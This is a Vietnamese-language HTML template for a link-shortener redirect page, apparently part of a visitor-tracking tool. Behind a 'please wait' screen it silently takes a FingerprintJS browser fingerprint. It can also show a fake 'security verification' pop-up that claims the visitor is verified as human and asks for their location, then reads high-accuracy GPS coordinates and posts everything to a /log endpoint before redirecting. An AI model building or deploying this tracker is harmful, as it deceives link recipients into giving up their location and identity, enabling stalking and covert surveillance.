<!DOCTYPE html>
<html>
<head>
    <title>Đang chuẩn bị...</title>
    <!-- Thư viện FingerprintJS -->
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <!-- Thư viện SweetAlert2 cho pop-up đẹp hơn -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        body { background-color: #11191f; color: #a9b5c3; font-family: -apple-system, system-ui, "Segoe UI", "Roboto", "Helvetica Neue", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica", sans-serif; text-align: center; padding-top: 20vh; margin: 0;}
        progress { width: 50%; }
        p { font-size: 1.1em; }
    </style>
</head>
<body>
    <p id="status-message">Vui lòng chờ trong khi chúng tôi xử lý...</p>
    <progress></progress>

    <script>
        const targetUrl = '<%= targetUrl %>';
        const shortId = '<%= shortId %>';
        const shouldRequestGPS = <%- requestGPS %>;

        const payload = {
            shortId,
            fingerprint: null,
            components: null,
            latitude: null,
            longitude: null,
            accuracy: null
        };
        
        async function runTracker() {
            try {
                // 1. Luôn lấy Fingerprint
                const fp = await FingerprintJS.load();
                const result = await fp.get();
                payload.fingerprint = result.visitorId;
                payload.components = result.components;

                // 2. Kiểm tra và yêu cầu GPS nếu cần
                if (shouldRequestGPS) {
                    await requestGPSPermission();
                }

            } catch (error) {
                console.error("Lỗi tracker chính:", error);
            } finally {
                // 3. Luôn gửi log và chuyển hướng
                await sendLogAndRedirect();
            }
        }
        
        function requestGPSPermission() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    console.log("Trình duyệt không hỗ trợ Geolocation.");
                    return resolve(); // Bỏ qua nếu không hỗ trợ
                }
                
                // Hiển thị pop-up
                Swal.fire({
                    title: 'Xác minh an toàn',
                    html: "Đã xác minh bạn là con người. Để tiếp tục, vui lòng cung cấp vị trí của bạn để tăng cường bảo mật.",
                    icon: 'info',
                    allowOutsideClick: false,
                    allowEscapeKey: false,
                    showDenyButton: true,
                    confirmButtonText: 'Đồng ý',
                    denyButtonText: `Từ chối`,
                    customClass: {
                        popup: 'swal2-dark',
                    }
                }).then((result) => {
                    if (result.isConfirmed) {
                        document.getElementById('status-message').innerText = "Đang lấy vị trí, vui lòng chờ...";
                        navigator.geolocation.getCurrentPosition(
                            (position) => { // Thành công
                                payload.latitude = position.coords.latitude;
                                payload.longitude = position.coords.longitude;
                                payload.accuracy = position.coords.accuracy;
                                resolve();
                            },
                            (error) => { // Thất bại
                                console.warn("Lỗi lấy GPS:", error.message);
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                        );
                    } else { // Từ chối
                        resolve();
                    }
                });
            });
        }
        
        async function sendLogAndRedirect() {
             document.getElementById('status-message').innerText = "Hoàn tất, đang chuyển hướng...";
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (logError) {
                console.error("Lỗi gửi log:", logError);
            } finally {
                window.location.href = targetUrl;
            }
        }
        
        runTracker();
    </script>
</body>
</html>
